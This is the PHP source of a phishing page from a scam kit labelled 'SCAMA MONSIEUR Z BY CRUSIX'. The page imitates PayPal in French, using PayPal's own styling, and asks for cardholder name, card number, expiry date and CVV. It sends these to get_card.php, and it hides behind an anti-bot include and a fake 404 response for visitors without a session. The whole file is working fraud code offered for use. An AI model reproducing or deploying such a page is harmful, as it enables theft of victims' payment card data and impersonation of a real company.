<?php
ob_start();
session_start();
/*
SCAMA MONSIEUR Z
BY CRUSIX
CARD.PHP
*/
include('../ANTIBOTS/antibots.php');
if(isset($_SESSION['billing'])){


?>
<html lang="fr" >
<head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0"><meta charset="utf-8">

 <link rel="shortcut icon" sizes="196x196" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/66d/35fa22be3bb5bbc6c31d9a12b8aa5/css/main.ltr.css"><title>PayPal&nbsp;: Confirmations</title>
<script src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>

</head><body class="vx_root vx_hasOpenModal vx_addFlowTransition">

 <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/ui-web/header-footer/1.40.0/header-footer.min.css">


<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader"><div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_logo" tabindex="-1"><div><div class="vx_modal-content"><header class="vx_modal-header"><h2 id="js_modalHeader" class="vx_text-2 header-centered">Confirmer une carte</h2>



<center><img style="width: 200px;" src="../RESSOURCES/img/sbvmc.png"></center>
  <p class="vx_text-body header-centered"></p>


</header><div class="vx_modal-body vx_blocks-for-mobile"><div><div class="vx_modal-body vx_blocks-for-mobile"><div class="form-container">

  <?php
if(strpos($_SERVER['REQUEST_URI'], 'blank=true')){
echo '<div class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message"><p role="alert" aria-live="assertive" class="vx_alert-text ">Veuillez remplir tous les champs</p></div>';
}
?>

 <?php
if(strpos($_SERVER['REQUEST_URI'], 'refused=true')){
echo '<div class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message"><p role="alert" aria-live="assertive" class="vx_alert-text ">La carte a été refusée</p></div>';
}
?>

	<form action="get_card.php" method="POST">

		



	<div class="vx_form-group vx_floatingLabel_active" data-label-content="Nom sur la carte"><label class="floatingLabel" for="cardNumber">Nom sur la carte</label><input type="text" id="cardName" aria-describedby="text-info-cardNumber" name="cardname" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Nom sur la carte"  value="<?php if(isset($_SESSION['last_name'])){ echo $_SESSION["last_name"]; } ?>"></div>


  <div class="vx_form-group vx_floatingLabel_active" data-label-content="Numéro de carte"><label class="floatingLabel" for="cardNumber">Numéro de carte</label><input onpaste="return false;" maxlength="16" type="text" id="authnetcim_cc_number" aria-describedby="text-info-cardNumber" name="cardnum" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Numéro de carte" autocomplete="off" value="" onkeypress="return isNumberKey(event)"  ></div>

   <div class="vx_form-group vx_floatingLabel_active" data-label-content="Date d'expiration (MM/AA)"><label class="floatingLabel" for="cardNumber">Date d'expiration (MM/AA)</label><input onpaste="return false;" maxlength="5" type="text" id="authnetcim_cc_number" aria-describedby="text-info-cardNumber" name="cardexp" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Date d'expiration (MM/AA)" autocomplete="off" value="" onkeypress="return isNumberKey(event)"  onkeyup="formatString(event);" ></div>

  <div class="vx_form-group vx_floatingLabel_active" data-label-content="CVV"><label class="floatingLabel" for="cardNumber">CVV</label><input onpaste="return false;" maxlength="5" type="password" id="authnetcim_cc_number" aria-describedby="text-info-cardNumber" name="cardcvv" class="test_cardNumber test_cardNumber vx_form-control" placeholder="CVV" autocomplete="off" value="" onkeypress="return isNumberKey(event)"  ></div>














</div><button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="" pa-marked="1">Confirmer ma carte</button><form id="js_addAddressForm" action="/myaccount/money/flow/cards/new/manual/new-address" method="POST"><input type="hidden" name="_csrf" value="PuC2HEIgFHztByO/Kp60B2Yo5wcqg+rZcjZ9s="><input type="hidden" name="expDate" id="js_addAddress-expDate"><input type="hidden" name="isFlow" value="false"></form></div></div></div></div></div></div>
</div><div>
</form>


<script>
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>


<script>
function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

</script>


			<script type="text/javascript" src="https://www.paypalobjects.com/ui-web/vx-pattern-lib/3-2-3/vx-lib.min.js"></script>

          </body></html>

<?php
}
else{
	 header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

?>